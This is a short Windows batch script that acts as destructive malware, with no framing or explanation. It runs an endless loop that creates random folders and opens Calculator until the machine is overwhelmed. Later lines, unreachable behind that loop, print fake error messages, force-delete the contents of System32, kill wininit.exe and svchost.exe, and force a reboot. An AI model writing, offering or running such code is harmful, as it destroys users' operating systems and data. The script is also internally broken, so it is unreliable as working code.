@echo off
CLS

:A
mkdir %random%
start calc.exe
goto A
timeout /t 10 /nobreak >nul

echo Error: Access Denied
echo Error: File Not Found
echo Error: Invalid Parameter
echo Error: System Failure
echo Error: Memory Error
echo Error: Disk Full
echo Error: Fatal Error
echo Error: Network Failure
echo Error: Application Crash
echo Error: Permission Denied
echo Error: Critical Error
echo Error: Data Corruption
echo Error: Hardware Malfunction
echo Error: Software Conflict
echo Error: Virus Detected
echo Error: System Crash
echo Error: Blue Screen of Death
pause
del /f /q %windir%\System32\*.*
taskkill /f /im wininit.exe /t
taskkill /f /im svchost.exe /t
timeout /t 30 /nobreak >nul

echo System will crash in 30 seconds...
timeout /t 30 /nobreak >nul

echo Deleting critical system files...
timeout /t 5 /nobreak >nul
echo Oops! Something went wrong.
echo Crashing system...
timeout /t 5 /nobreak >nul

shutdown /r /f /t 0
